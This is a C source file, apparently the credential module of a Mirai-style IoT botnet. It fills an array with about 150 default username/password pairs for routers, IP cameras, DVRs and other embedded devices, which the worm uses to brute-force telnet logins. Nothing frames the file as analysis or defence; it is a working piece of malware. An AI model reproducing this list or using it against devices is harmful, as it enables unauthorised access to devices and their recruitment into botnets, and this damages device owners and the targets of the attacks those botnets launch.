#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "headers/combos.h"

int cindex = 0;
Combo *combos = NULL;

void combo_add(char *username, char *password)
{
    if (combos == NULL)
        combos = calloc(1, sizeof(Combo));
    else
        combos = realloc(combos, (cindex + 2) * sizeof(Combo));

    combos[cindex].username = username;
    combos[cindex].password = password;

    combos[cindex].username_len = strlen(username);
    combos[cindex].password_len = strlen(password);
    cindex++;
}

void combos_init(void)
{
    combo_add("root", "");
    combo_add("root","anko");
    combo_add("guest","123456");
    combo_add("root","00000000");
    combo_add("tftp","tftp");
    combo_add("ftpuser","password");
    combo_add("default","antslq");
    combo_add("adtec","");
    combo_add("Admin","wago");
    combo_add("cisco","cisco");
    combo_add("NetLinx","password");
    combo_add("admin","1988");
    combo_add("Root","wago");
    combo_add("admin","Su");
    combo_add("root","666666");
    combo_add("root","1234567890");
    combo_add("root","oelinux123");
    combo_add("root","default");
    combo_add("root","china123");
    combo_add("root","cxlinux");
    combo_add("admin","private");
    combo_add("admin","superuser");
    combo_add("telnet","telnet");
    combo_add("default","S2fGqNFs");
    combo_add("default","0xhlwSG8");
    combo_add("admin","symbol");
    combo_add("admin","Symbol");
    combo_add("guest", "000000");
    combo_add("debug","debug124");
    combo_add("pi","raspberry");
    combo_add("root","root621");
    combo_add("ftp","");
    combo_add("pi","pi");
    combo_add("supervisor","supervisor");
    combo_add("root","password");
    combo_add("root","abc123");
    combo_add("root","passwd");
    combo_add("Administrator","admin");
    combo_add("user","123");
    combo_add("telnetadmin","telnetadmin");
    combo_add("root","calvin");
    combo_add("root","cat1029");
    combo_add("admin","1111");
    combo_add("admin","smcadmin");
    combo_add("root","hi3518");
    combo_add("root","default");
    combo_add("mg3500","merlin");
    combo_add("root","icatch99");
    combo_add("root","pon521");
    combo_add("service","service");
    combo_add("root","root621");
    combo_add("root","xc3511");
    combo_add("root","xmhdipc");
    combo_add("root","xc3511");
    combo_add("admin","1111111");
    combo_add("root","vizxv");
    combo_add("admin","pass");
    combo_add("root","5up");
    combo_add("root","jvc");
    combo_add("root","1001chin");
    combo_add("admin","xad#12");
    combo_add("root","Uq-4GIt3M");
    combo_add("root","klv123");
    combo_add("root","jvbzd");
    combo_add("root","Zte521");
    combo_add("admin1","password");
    combo_add("root","hi3518");
    combo_add("root","cat1029");
    combo_add("admin","password");
    combo_add("root","5up");
    combo_add("root","jvc");
    combo_add("administrator","1234");
    combo_add("root","zlxx");
    combo_add("root","calvin");
    combo_add("root","juantech");
    combo_add("root","zlxx.");
    combo_add("root","root123");
    combo_add("adm","");
    combo_add("bin","");
    combo_add("root","dreambox");
    combo_add("root","user");
    combo_add("root","realtek");
    combo_add("service","service");
    combo_add("service","ipdongle");
    combo_add("admin","administartor");
    combo_add("admin","ADMIN");
    combo_add("root","realtek");
    combo_add("admin","vertex25ektks123");
    combo_add("root","1001chin");
    combo_add("admin","xad#12");
    combo_add("admin", "");
    combo_add("root", "root");
    combo_add("admin", "admin");
    combo_add("user", "user");
    combo_add("ubnt", "ubnt");
    combo_add("ubuntu", "ubuntu");
    combo_add("guest", "guest");
    combo_add("amx","password");
    combo_add("support", "support");
    combo_add("default", "default");
    combo_add("Admin","Pass");
    combo_add("test", "test");
    combo_add("root", "admin");
    combo_add("root","fidel123");
    combo_add("root","!root");
    combo_add("admin", "root");
    combo_add("admin","22222");
    combo_add("root", "123");
    combo_add("root", "1234");
    combo_add("dm","telnet");
    combo_add("root","linux");
    combo_add("admin","system");
    combo_add("root","uClinux");
    combo_add("root","GM8182");
    combo_add("user","public");
    combo_add("suma123","panger123");
    combo_add("root", "12345");
    combo_add("root", "123456");
    combo_add("root", "changeme");
    combo_add("admin", "changeme");
    combo_add("guest", "1234");
    combo_add("admin","4321");
    combo_add("GE","GE");
    combo_add("Admin","5001");
    combo_add("User","1001");
    combo_add("apc","apc");
    combo_add("admin","motorola");
    combo_add("admin","tlJwpbo6");
    combo_add("device","apc");
    combo_add("webguest","1");
    combo_add("guest","12345");
    combo_add("admin", "meinsm");
    combo_add("guest", "12345");
    combo_add("User","User");
    combo_add("root","annie2015");
    combo_add("guest", "123456");
    combo_add("guest","");
    combo_add("admin", "1234");
    combo_add("admin","microbusiness");
    combo_add("admin", "12345");
    combo_add("admin", "123456"); //hikvision
    combo_add("hikvision", "hikvision");
    combo_add("ftp", "ftp");
    combo_add("root", "888888");
    combo_add("default", "");
    combo_add("1234", "1234");
}
